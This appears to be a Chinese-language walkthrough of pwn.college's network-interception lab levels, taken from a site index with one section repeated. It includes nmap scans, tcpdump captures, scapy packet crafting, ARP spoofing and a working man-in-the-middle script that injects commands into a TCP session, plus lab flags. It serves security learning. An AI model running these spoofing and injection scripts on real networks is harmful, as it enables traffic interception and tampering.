traffic from a remote host # \u8001\u89c4\u77e9\u5148\u770b\u4e00\u4e0b tcpdump -i any port 31337 # \u8fd9\u4e2a\u9898\u4e5f\u6bd4\u8f83\u6c34\u4e86\uff0c\u5c31\u662f\u6bcf\u4e2a\u5305\u53ea\u53d1\u9001\u5176\u4e2d\u7684\u4e00\u4f4d\uff0c\u7136\u540e\u4f60\u7b4958\u4e2a\u5305\uff0c\u5c31\u51d1\u9f50\u4e86\u3002 tcpdump -i any port 31337 and src 10.0.0.2 and dst 10.0.0.3 and greater 1 -X \u7136\u540e\u8f93\u51fa\u5927\u6982\u662f\u8fd9\u6837\u7684 01:32:10.535829 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 5:6, ack 6, win 510, options [nop,nop,TS val 4116082894 ecr 1192609080], length 1 0x0000: 4500 0035 9482 4000 4006 923c 0a00 0002 E..5..@.@..<.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8af feb5 c987 ....zi.j........ 0x0020: 8018 01fe eab4 0000 0101 080a f556 70ce .............Vp. 0x0030: 4715 c538 63 G..8c 01:32:11.537097 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 6:7, ack 7, win 510, options [nop,nop,TS val 4116083896 ecr 1192610081], length 1 0x0000: 4500 0035 9483 4000 4006 923b 0a00 0002 E..5..@.@..;.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b0 feb5 c988 ....zi.j........ 0x0020: 8018 01fe d6df 0000 0101 080a f556 74b8 .............Vt. 0x0030: 4715 c921 6f G..!o 01:32:12.538387 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 7:8, ack 8, win 510, options [nop,nop,TS val 4116084897 ecr 1192611083], length 1 0x0000: 4500 0035 9484 4000 4006 923a 0a00 0002 E..5..@.@..:.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b1 feb5 c989 ....zi.j........ 0x0020: 8018 01fe d20a 0000 0101 080a f556 78a1 .............Vx. 0x0030: 4715 cd0b 6c G...l 01:32:13.539649 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 8:9, ack 9, win 510, options [nop,nop,TS val 4116085898 ecr 1192612084], length 1 0x0000: 4500 0035 9485 4000 4006 9239 0a00 0002 E..5..@.@..9.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b2 feb5 c98a ....zi.j........ 0x0020: 8018 01fe ca36 0000 0101 080a f556 7c8a .....6.......V|. 0x0030: 4715 d0f4 6c G...l 01:32:14.540780 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 9:10, ack 10, win 510, options [nop,nop,TS val 4116086899 ecr 1192613085], length 1 0x0000: 4500 0035 9486 4000 4006 9238 0a00 0002 E..5..@.@..8.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b3 feb5 c98b ....zi.j........ 0x0020: 8018 01fe c962 0000 0101 080a f556 8073 .....b.......V.s 0x0030: 4715 d4dd 65 G...e 01:32:15.541382 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 10:11, ack 11, win 510, options [nop,nop,TS val 4116087900 ecr 1192614086], length 1 0x0000: 4500 0035 9487 4000 4006 9237 0a00 0002 E..5..@.@..7.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b4 feb5 c98c ....zi.j........ 0x0020: 8018 01fe bf8e 0000 0101 080a f556 845c .............V.\\ 0x0030: 4715 d8c6 67 G...g 01:32:16.542597 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 11:12, ack 12, win 510, options [nop,nop,TS val 4116088901 ecr 1192615087], length 1 0x0000: 4500 0035 9488 4000 4006 9236 0a00 0002 E..5..@.@..6.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b5 feb5 c98d ....zi.j........ 0x0020: 8018 01fe b9ba 0000 0101 080a f556 8845 .............V.E 0x0030: 4715 dcaf 65 G...e \u6211\u4eec\u5c31\u628a\u6700\u540e\u4e00\u4f4d\u62fc\u8d77\u6765\u5c31\u884c\u4e86\uff0c\u53cd\u6b63\u8fd9\u4e00\u6b65\u5927\u6982\u6709\u70b9\u513f\u70e6\uff0c\u53ef\u4ee5\u5199\u811a\u672c\uff0c\u4e5f\u53ef\u4ee5\u81ea\u5df1\u624b\u52a8\u590d\u5236:( # \u597d\u5427\uff0c\u6211\u811a\u672c\u6ca1\u5199\u5bf9\uff0c\u81ea\u5df1\u624b\u52a8\u590d\u5236\u7684\uff0c\u5c3c\u739b pwn.college{kNJHOFI1VRpp7QOATsbMSjGQiQp.dRjNzMDL2QjMyMzW} level7 Hijack traffic from a remote host by configuring your network interface tcpdump -i any # \u53d1\u73b010.0.0.4\u4e00\u76f4\u5728\u53d1\u9001\u8bf7\u6c42\u3002\u8fd9\u65f6\u5019\u6211\u9a97\u5b83\u5e94\u8be5\u5c31\u884c\u4e86\u3002 ip addr add 10.0.0.2/8 dev eth0 \u7136\u540e\u53d1\u73b0\u4e86\u8fd9\u4e9b\u5305 listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes 15:07:21.562729 eth0 B ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28 15:07:21.562752 eth0 Out ARP, Reply 10.0.0.2 is-at fa:9a:ce:e8:ef:b2 (oui Unknown), length 28 15:07:21.562833 eth0 In IP 10.0.0.4.37984 > 10.0.0.2.31337: Flags [S], seq 1279607758, win 64240, options [mss 1460,sackOK,TS val 1986706165 ecr 0,nop,wscale 7], length 0 15:07:21.562843 eth0 Out IP 10.0.0.2.31337 > 10.0.0.4.37984: Flags [R.], seq 0, ack 1279607759, win 0, length 0 15:07:21.639815 lo In IP localhost.53883 > 127.0.0.11.domain: 51406+ PTR? 2.0.0.10.in-addr.arpa. (39) 15:07:21.639846 lo In IP 127.0.0.11 > localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75 15:07:21.639911 lo In IP localhost.39242 > 127.0.0.11.domain: 51406+ PTR? 2.0.0.10.in-addr.arpa. (39) 15:07:21.639923 lo In IP 127.0.0.11 > localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75 15:07:21.640042 lo In IP localhost.46035 > 127.0.0.11.domain: 13917+ PTR? 4.0.0.10.in-addr.arpa. (39) 15:07:21.640052 lo In IP 127.0.0.11 > localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75 15:07:21.640103 lo In IP localhost.50224 > 127.0.0.11.domain: 13917+ PTR? 4.0.0.10.in-addr.arpa. (39) \u8fd9\u4e2aR\u8bf4\u660ereset\u4f4d\uff1a\u200b\u200b\u200b\u200b\u200b\u200b \u8868\u793aTCP\u8fde\u63a5\u4e2d\u51fa\u73b0\u5f02\u5e38\u5fc5\u987b\u5f3a\u5236\u65ad\u5f00\u8fde\u63a5\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u6ca1\u6709\u88ab\u4f7f\u7528\u7684\u7aef\u53e3\u5373\u4f7f\u53d1\u6765\u4e86\u8fde\u63a5\u8bf7\u6c42\uff0c\u4e5f\u65e0\u6cd5\u901a\u4fe1\u3002 \u7136\u540e\u76d1\u542c\u5373\u53ef nc -l 31337 \u8fd9\u9898\u770b\u4e86\u8bb2\u89e3\u624d\u4f1a\uff0c\u5c31\u5361\u5728\u4e0d\u77e5\u9053\u600e\u4e48\u770b\u8fd9\u4e2a\u6807\u5fd7\u4f4d\u4e0a\uff0c\u679c\u7136\u77e5\u8bc6\u5904\u5904\u662f\u76f2\u533a \u7136\u540e\u5728\u4f60\u76d1\u542c\u4ee5\u540e\uff0c\u5c31\u4f1a\u53d8\u6210PUSH\u6807\u5fd7\u4f4d\u3002 ///@TODO: \u5173\u4e8e\u540e\u9762\u7684\u53d1\u5305\uff0c\u6211\u6240\u6709ARP\u5565\u7684\u57fa\u672c\u4e0a\u90fd\u662f\u53d1\u9001\u7684\u5e7f\u64ad\u5730\u5740\uff0c\u8bb2\u89e3\u4e4b\u4e2d\u53d1\u9001\u7ed9\u7279\u5b9a\u5730\u5740\uff0c\u6ca1\u6709\u5fc5\u8981\uff0c\u800c\u4e14\u7531\u4e8e\u6211\u6709\u7684\u5173\u5361\u4f4f\uff0c\u5982\u679c\u53d1\u9001\u7ed9\u7279\u5b9a\u7684\u7269\u7406\u7f51\u5361\uff0c\u6211\u6bcf\u6b21\u91cd\u5f00\u6311\u6218\u90fd\u8981\u91cd\u65b0\u67e5\u770b\uff0c\u6709\u70b9\u513f\u9ebb\u70e6\u3002 level8 Manually send an Ethernet packet \u4e3b\u8981\u662f\u4f7f\u7528scapy >>> sendp(Ether(src=\"4a:b3:c7:c5:08:7d\",dst=\"ff:ff:ff:ff:ff:ff\",type=0xFFFF),iface=\"eth0\") . Sent 1 packets. pwn.college{wl9Wr84duLuF_XsCsoo6EiqhnU3.dZjNzMDL2QjMyMzW} level9 Manually send an Internet Protocol packet \u53d1IP\u4e86 >>> sendp(Ether(src=\"52:bc:a3:08:14:d1\",dst=\"ff:ff:ff:ff:ff:ff\", type=0x0800) / IP(proto=0xFF, src=\"127.0.0.1\",dst=\"10.0.0.3\"), iface=\"eth0\") . Sent 1 packets. pwn.college{c5HrfavanBMm_0po-E47NuCoY2J.ddjNzMDL2QjMyMzW} level10 Manually send a Transmission Control Protocol packet >>> sendp(Ether(src=\"12:af:41:92:01:6f\",dst=\"ff:ff:ff:ff:ff:ff\", type=0x0800) / IP(src=\"127.0.0.1\", dst=\"10.0.0.3\", proto=0x06) / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags=\"APRSF\"), ...: iface=\"eth0\") . Sent 1 packets. pwn.college{gSJcnHgB4dNz17jCCuEduVjMEF_.dhjNzMDL2QjMyMzW} level11 Manually perform a Transmission Control Protocol handshake sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"10.0.0.2\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, seq=31337, flags=\"S\"),iface=\"eth0\") sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"10.0.0.2\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, ack=1235161237, seq=31338,flags=\"A\"),iface=\"eth0\") pwn.college{cMG0JWm3rTQmJHtfC-JNorRv6Ef.dljNzMDL2QjMyMzW} \u591a\u4e48\u7f8e\u5999\u7684\u4e00\u5f20\u56fe level12 Manually send an Address Resolution Protocol packet >>> sendp(Ether(dst=\"ff:ff:ff:ff:ff:ff\", src=get_if_hwaddr(\"eth0\")) / ARP(op=\"is-at\", hwsrc=get_if_h ...: waddr(\"eth0\"), psrc=\"10.0.0.2\", hwdst=\"ff:ff:ff:ff:ff:ff\", pdst=\"10.0.0.3\"), iface=\"eth0\") . Sent 1 packets. pwn.college{0mowkGco5uatE6V9v8I1lPZ2xHa.dBzNzMDL2QjMyMzW} level13 Hijack traffic from a remote host using ARP \u5148\u89c2\u5bdf\u4e00\u6ce2 root@ip-10-0-0-3:~# ip a 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether e6:19:83:95:20:c7 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.0.0.3/16 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::e419:83ff:fe95:20c7/64 scope link valid_lft forever preferred_lft forever root@ip-10-0-0-3:~# \u5f88\u5c2c\uff0c\u5c31\u81ea\u5df1\u778e\u505a\u628a arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=\"e6:19:83:95:20:c7\", psrc=\"10.0.0.3\", pdst=\"10.0.0.4\") remote_mac = arp_response[0][1].hwsrc tcp_redirect = Ether(src=remote_mac, dst=\"e6:19:83:95:20:c7\") / IP(src=\"10.0.0.4\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, flags=\"PA\", seq=123456, ack=0) arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=\"e6:19:83:95:20:c7\", psrc=\"10.0.0.3\", pdst=\"10.0.0.2\") remote_mac = arp_response[0][1].hwsrc tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=\"10.0.0.4\", dst=local_ip) / TCP(sport=31338, dport=31337, flags=\"PA\", seq=123456, ack=0) \u770b\u8d77\u6765\uff0c\u53c8\u662f\u5efa\u7acb\u94fe\u63a5\uff1f sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"10.0.0.2\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, seq=31337, flags=\"A\"),iface=\"eth0\") \u8fc7\u7a0b\u90fd\u5199\u5b8c\u4e86\uff0c\u53ef\u4ee5\u5199\u811a\u672c\u4e86 from scapy.all import * # \u83b7\u53d6\u672c\u5730\u63a5\u53e3\u7684 MAC \u548c IP \u5730\u5740 local_mac = get_if_hwaddr(\"eth0\") local_ip = get_if_addr(\"eth0\") # \u6784\u9020 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u6b3a\u9a97\u76ee\u6807\u4e3b\u673a arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=local_mac, psrc=local_ip, pdst=\"10.0.0.4\") # \u53d1\u9001 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u5e76\u83b7\u53d6\u76ee\u6807\u4e3b\u673a\u7684 MAC \u5730\u5740 arp_response = srp(arp_request, timeout=2, iface=\"eth0\", verbose=False)[0] remote_mac = arp_response[0][1].hwsrc # \u6784\u9020 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u5c06\u6d41\u91cf\u91cd\u5b9a\u5411\u5230\u672c\u5730\u4e3b\u673a tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=\"10.0.0.4\", dst=local_ip) / TCP(sport=31337, dport=31337, flags=\"PA\", seq=123456, ack=0) # \u53d1\u9001 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u52ab\u6301\u6d41\u91cf sendp(tcp_redirect, iface=\"eth0\") from scapy.all import * # \u83b7\u53d6\u672c\u5730\u63a5\u53e3\u7684 MAC \u548c IP \u5730\u5740 local_mac = get_if_hwaddr(\"eth0\") local_ip = get_if_addr(\"eth0\") # \u6784\u9020 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u6b3a\u9a97\u76ee\u6807\u4e3b\u673a arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=local_mac, psrc=local_ip, pdst=\"10.0.0.2\") # \u53d1\u9001 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u5e76\u83b7\u53d6\u76ee\u6807\u4e3b\u673a\u7684 MAC \u5730\u5740 arp_response = srp(arp_request, timeout=2, iface=\"eth0\", verbose=False)[0] remote_mac = arp_response[0][1].hwsrc # \u6784\u9020 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u5c06\u6d41\u91cf\u91cd\u5b9a\u5411\u5230\u672c\u5730\u4e3b\u673a tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=\"10.0.0.2\", dst=local_ip) / TCP(sport=31337, dport=31337, flags=\"PA\", seq=123456, ack=0) # \u53d1\u9001 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u52ab\u6301\u6d41\u91cf sendp(tcp_redirect, iface=\"eth0\") \u597d\u5427\uff0c\u6574\u4e86\u4e00\u5927\u5806\uff0c\u7136\u540e\u53d1\u73b0\u641e\u9519\u4e86\uff0c\u6ca1\u90a3\u4e48\u590d\u6742\uff0cG\u3002\u3002\u3002 \u6b63\u786e\u89e3\u7b54\u5982\u4e0b\uff1a root@ip-10-0-0-3:~# arping 10.0.0.4 ARPING 10.0.0.4 42 bytes from ce:b6:65:76:0a:83 (10.0.0.4): index=0 time=17.107 usec 42 bytes from ce:b6:65:76:0a:83 (10.0.0.4): index=1 time=13.761 usec ^C --- 10.0.0.4 statistics --- 2 packets transmitted, 2 packets received, 0% unanswered (0 extra) rtt min/avg/max/std-dev = 0.014/0.015/0.017/0.002 ms root@ip-10-0-0-3:~# sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ce:b6:65:76:0a:83\") / ARP(op=\"is-at\",hwsrc=get_if_hwaddr(\"eth0\"),psrc=\"10.0.0.2\",hwdst=\"ce:b6:65:76:0a:83\",pdst=\"10.0.0.4\"),iface=\"eth0\") pwn.college{cNTaa8AjxVE-lSXY9DgEeXxNMHz.dFzNzMDL2QjMyMzW} level14 Man-in-the-middle traffic between two remote hosts and inject extra traffic \u4ece\u8bb2\u89e3\u6765\u770b\uff0c\u8fd9\u4e2a\u9898\u7684\u6838\u5fc3\u662f\u9700\u8981\u52a0\u5165\u5bf9\u8bdd\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u76d1\u542c\uff0c\u56e0\u4e3a\u5bf9\u8bdd\u4e2d\u6709\u4e00\u6b21\u6027\u5bc6\u94a5\uff0c\u4ec5\u4ec5\u76d1\u542c\u5e76\u4e0d\u7ba1\u7528\uff0c\u91cd\u70b9\u662f\u6293\u4f4f\u7a97\u53e3\u671f\u53d1\u9001\u5305\u542b\u6709FLAG\u7684\u5305\u3002 \u76f4\u63a5\u5199\u4e2a\u811a\u672c from scapy.all import * sendp(Ether(src=get_if_hwaddr(\"eth0\")) / ARP(op=\"is-at\",hwsrc=get_if_hwaddr(\"eth0\"), psrc=\"10.0.0.3\",pdst=\"10.0.0.4\"),iface=\"eth0\") #tell 10.0.0.4\uff0cwhere 10.0.0.3 it is sendp(Ether(src=get_if_hwaddr(\"eth0\")) / ARP(op=\"is-at\",hwsrc=get_if_hwaddr(\"eth0\"), psrc=\"10.0.0.4\",pdst=\"10.0.0.3\"),iface=\"eth0\") #tell 10.0.0.3\uff0cwhere 10.0.0.4 it is packet_data = { 'key': '', 'dst': '', 'src': '', 'ipdst': '', 'ipsrc': '', 'ipflags': '', 'sport': 0, 'dport': 31337, 'flags': '', 'seq': 0, 'ack': 0 } def CallBack(packet): if packet.haslayer('TCP'): tcp = packet['TCP'] ip = packet['IP'] ether = packet['Ethernet'] load = tcp.load if hasattr(tcp, 'load') else b'' if ip.src == '10.0.0.4' and load != b'ECHO\\n': packet_data['key'] = load if ip.src == '10.0.0.3' and load == b'COMMANDS:\\nECHO\\nFLAG\\nCOMMAND:\\n': print(\"WARNING!!\") packet_data.update({ 'ipdst': ip.src, 'ipsrc': ip.dst, 'flags': 'PA', 'ipflags': ip.flags, 'dst': ether.src, 'src': ether.dst, 'dport': tcp.sport, 'sport': tcp.dport, 'seq': tcp.ack, 'ack': tcp.seq + 29 }) raw_pkt = Raw(load='FLAG\\n') (Ether(src=packet_data['src'], dst=packet_data['dst']) / IP(src=packet_data['ipsrc'], dst=packet_data['ipdst'], flags=packet_data['ipflags']) / TCP(dport=packet_data['dport'], sport=packet_data['sport'], seq=packet_data['seq'], ack=packet_data['ack'], flags=packet_data['flags']) / raw_pkt).display() sendp(Ether(src=packet_data['src'], dst=packet_data['dst']) / IP(src=packet_data['ipsrc'], dst=packet_data['ipdst'], flags=packet_data['ipflags']) / TCP(dport=packet_data['dport'], sport=packet_data['sport'], seq=packet_data['seq'], ack=packet_data['ack'], flags=packet_data['flags']) / raw_pkt, iface=\"eth0\") sniff(filter=\"tcp\", prn=CallBack, iface='eth0', count=100) \u7136\u540e\u987a\u5229\u62ff\u5230flag pwn.college{A3pb7kfH8On2sOV2_hSlPGWG_P8.dJzNzMDL2QjMyMzW} \u53ef\u4ee5\u770b\u8fd9\u4e2a \u89c6\u9891\u8bb2\u89e3 \u788e\u788e\u5ff5\uff1a\u8fd9\u4e2a\u90e8\u5206\u5176\u5b9e\u4e0d\u592a\u96be\uff0c\u91cd\u70b9\u662f\u5b66\u4f1ascapy\u5373\u53ef\uff0c\u4f46\u662f\u8be1\u5f02\u7684\u5730\u65b9\u5728\u4e8e\u5fc5\u987b\u4f7f\u7528tmux\uff0c\u597d\u50cf\u8fd9\u6837\u624d\u80fd\u5728\u4e00\u4e2a\u7236\u7ebf\u7a0b\u4e4b\u4e0b\uff0c\u4e0d\u7136\u4f60\u5728\u53e6\u4e00\u4e2ashell\u91cc\u9762\u4f7f\u7528python\u811a\u672c\uff0c\u8fd9\u4e2ashell\u91cc\u9762\u7684tcpdump\u6293\u4e0d\u5230\u4e1c\u897f\u3002\u8fd9\u66fe\u7ecf\u56f0\u6270\u4e86\u6211\u5f88\u4e45\uff0c\u522b\u7684\u5c31\u6ca1\u5565\u4e86\u3002","title":"Knowledge"},{"location":"en/CSE365/Intercepting%20Communication/#knowledge","text":"\u8fd9\u4e00\u90e8\u5206\u662f\u4e00\u4e2a\u6781\u7b80\u7248\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u7684\u77e5\u8bc6\u3002 \u5927\u6982\u610f\u601d\u662f\u4f60\u9700\u8981\u5efa\u7acb\u4e00\u4e2a\u56db\u5c42\u7f51\u7edc\u6a21\u578b\u7684\u6982\u5ff5\uff0c\u7136\u540e\u5efa\u7acb\u8d77\u6bcf\u4e00\u5c42\u6240\u4f7f\u7528\u7684\u534f\u8bae\u548c\u6570\u636e\u5305\u90fd\u662f\u4ec0\u4e48 \u4ece\u4e0b\u5f80\u4e0a\u4f9d\u6b21\u662f\u8fd9\u6837\u7684\uff1a HTTP---\u5b9e\u73b0\u529f\u80fd TCP---\u8bc6\u522b\u8fdb\u7a0b IP---\u8bc6\u522b\u4e3b\u673a ARP(ETHER)---\u7269\u7406\u7f51\u5361 \u7136\u540e\u672c\u90e8\u5206\u5c31\u662f\u7814\u7a76\u4ee5\u8fd9\u4e9b\u5305\u4e3a\u57fa\u7840\u5efa\u7acb\u8d77\u7684\u901a\u8baf\u7684\u4e00\u4e9b\u8fc7\u7a0b\u3002","title":"Knowledge"},{"location":"en/CSE365/Intercepting%20Communication/#scapy","text":"\u53d1\u5305\u53ef\u4ee5\u770b \u8fd9\u4e2a level14\u9700\u8981\u4f7f\u7528sniff","title":"\u5b9e\u7528\u5de5\u5177scapy"},{"location":"en/CSE365/Intercepting%20Communication/#_1","text":"tcpdump\u5df2\u7ecf\u8db3\u591f\u597d\u7528\u4e86\uff0cwireshark\u662f\u66f4\u5f3a\u5927\u7684\u56fe\u5f62\u5316\u5de5\u5177\uff0c\u53ea\u4e0d\u8fc7\u6211\u8fde\u90a3\u4e2a\u5b9e\u9a8c\u73af\u5883\u603b\u662f\u5f88\u5361\uff0c\u6240\u4ee5\u6700\u540e\u90fd\u91c7\u53d6\u547d\u4ee4\u884c\u4e86\u3002","title":"\u5176\u4ed6"},{"location":"en/CSE365/Intercepting%20Communication/#wp","text":"","title":"WP"},{"location":"en/CSE365/Intercepting%20Communication/#level1-connect-to-a-remote-host","text":"nc 10.0.0.3 31337","title":"level1 Connect to a remote host"},{"location":"en/CSE365/Intercepting%20Communication/#level2-listen-for-a-connection-from-a-remote-host","text":"nc -l 31337","title":"level2 Listen for a connection from a remote host"},{"location":"en/CSE365/Intercepting%20Communication/#level3-find-and-connect-to-a-remote-host","text":"# \u626b\u63cf\u7aef\u53e3nmap -p 31337 10.0.0.0/24 root@ip-10-0-0-2:~# nmap -p 31337 10.0.0.0/24 Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-15 22:54 UTC Nmap scan report for 10.0.0.47 Host is up (0.000090s latency). PORT STATE SERVICE 31337/tcp open Elite MAC Address: 1A:78:B6:5A:08:A8 (Unknown) Nmap scan report for 10.0.0.2 Host is up (0.000058s latency). PORT STATE SERVICE 31337/tcp closed Elite Nmap done: 256 IP addresses (2 hosts up) scanned in 28.46 seconds root@ip-10-0-0-2:~# nc 10.0.0.2 31337 root@ip-10-0-0-2:~# nc 10.0.0.47 31337 # \u51fa\u73b0flag","title":"level3 Find and connect to a remote host"},{"location":"en/CSE365/Intercepting%20Communication/#level4-find-and-connect-to-a-remote-host-on-a-large-network","text":"root@ip-10-0-0-2:~# nmap -p 31337 -T5 10.0.0.0/16 Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-15 23:44 UTC Nmap scan report for 10.0.0.2 Host is up (0.000053s latency). PORT STATE SERVICE 31337/tcp closed Elite Nmap scan report for 10.0.211.92 Host is up (0.000093s latency). PORT STATE SERVICE 31337/tcp open Elite MAC Address: D6:5F:9A:28:AE:26 (Unknown) Nmap done: 65536 IP addresses (2 hosts up) scanned in 2583.60 seconds # \u8fd9\u4e2a\u6211\u6ca1\u5565\u597d\u529e\u6cd5\uff0c\u611f\u89c9\u65f6\u95f4\u5f88\u957f\u554a\u3002 nc 10.0.211.92 31337","title":"level4 Find and connect to a remote host on a large network"},{"location":"en/CSE365/Intercepting%20Communication/#level5-monitor-traffic-from-a-remote-host","text":"tcpdump -i any port 31337 # \u5148\u8fd9\u6837\u770b\u4e00\u4e0b\uff0c\u53d1\u73b0\u5305\u662f\u91cd\u590d\u7684\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a\u6570\u636e\u5305\u957f\u5ea6\u4e3a58\uff0c\u63a8\u6d4b\u6709\u7528 tcpdump -i any port 31337 -X # \u8fd9\u4f1a\u8f93\u51fa\u5177\u4f53\u7684\u5341\u516d\u8fdb\u5236\u548cascii\u7801 # \u7136\u540e\u5c31\u5f97\u5230\u4e86\u5177\u4f53\u7684\u5305\u4e86 01:10:28.660067 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.50004: Flags [P.], seq 1:59, ack 60, win 509, options [nop,nop,TS val 4114781018 ecr 1191307187], length 58 0x0000: 4500 006e 4d18 4000 4006 d96d 0a00 0002 E..nM.@.@..m.... 0x0010: 0a00 0003 7a69 c354 b6ab 89fa 61ea 4259 ....zi.T....a.BY 0x0020: 8018 01fd c37f 0000 0101 080a f542 935a .............B.Z 0x0030: 4701 e7b3 7077 6e2e 636f 6c6c 6567 657b G...pwn.college{ 0x0040: 5934 4a50 5173 526d 4367 4e71 636a 6e69 Y4JPQsRmCgNqcjni 0x0050: 6532 3878 7775 4961 5755 4e2e 644e 6a4e e28xwuIaWUN.dNjN 0x0060: 7a4d 444c 3251 6a4d 794d 7a57 7d0a zMDL2QjMyMzW}.","title":"level5 Monitor traffic from a remote host"},{"location":"en/CSE365/Intercepting%20Communication/#level6-monitor-slow-traffic-from-a-remote-host","text":"# \u8001\u89c4\u77e9\u5148\u770b\u4e00\u4e0b tcpdump -i any port 31337 # \u8fd9\u4e2a\u9898\u4e5f\u6bd4\u8f83\u6c34\u4e86\uff0c\u5c31\u662f\u6bcf\u4e2a\u5305\u53ea\u53d1\u9001\u5176\u4e2d\u7684\u4e00\u4f4d\uff0c\u7136\u540e\u4f60\u7b4958\u4e2a\u5305\uff0c\u5c31\u51d1\u9f50\u4e86\u3002 tcpdump -i any port 31337 and src 10.0.0.2 and dst 10.0.0.3 and greater 1 -X \u7136\u540e\u8f93\u51fa\u5927\u6982\u662f\u8fd9\u6837\u7684 01:32:10.535829 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 5:6, ack 6, win 510, options [nop,nop,TS val 4116082894 ecr 1192609080], length 1 0x0000: 4500 0035 9482 4000 4006 923c 0a00 0002 E..5..@.@..<.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8af feb5 c987 ....zi.j........ 0x0020: 8018 01fe eab4 0000 0101 080a f556 70ce .............Vp. 0x0030: 4715 c538 63 G..8c 01:32:11.537097 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 6:7, ack 7, win 510, options [nop,nop,TS val 4116083896 ecr 1192610081], length 1 0x0000: 4500 0035 9483 4000 4006 923b 0a00 0002 E..5..@.@..;.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b0 feb5 c988 ....zi.j........ 0x0020: 8018 01fe d6df 0000 0101 080a f556 74b8 .............Vt. 0x0030: 4715 c921 6f G..!o 01:32:12.538387 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 7:8, ack 8, win 510, options [nop,nop,TS val 4116084897 ecr 1192611083], length 1 0x0000: 4500 0035 9484 4000 4006 923a 0a00 0002 E..5..@.@..:.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b1 feb5 c989 ....zi.j........ 0x0020: 8018 01fe d20a 0000 0101 080a f556 78a1 .............Vx. 0x0030: 4715 cd0b 6c G...l 01:32:13.539649 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 8:9, ack 9, win 510, options [nop,nop,TS val 4116085898 ecr 1192612084], length 1 0x0000: 4500 0035 9485 4000 4006 9239 0a00 0002 E..5..@.@..9.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b2 feb5 c98a ....zi.j........ 0x0020: 8018 01fe ca36 0000 0101 080a f556 7c8a .....6.......V|. 0x0030: 4715 d0f4 6c G...l 01:32:14.540780 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 9:10, ack 10, win 510, options [nop,nop,TS val 4116086899 ecr 1192613085], length 1 0x0000: 4500 0035 9486 4000 4006 9238 0a00 0002 E..5..@.@..8.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b3 feb5 c98b ....zi.j........ 0x0020: 8018 01fe 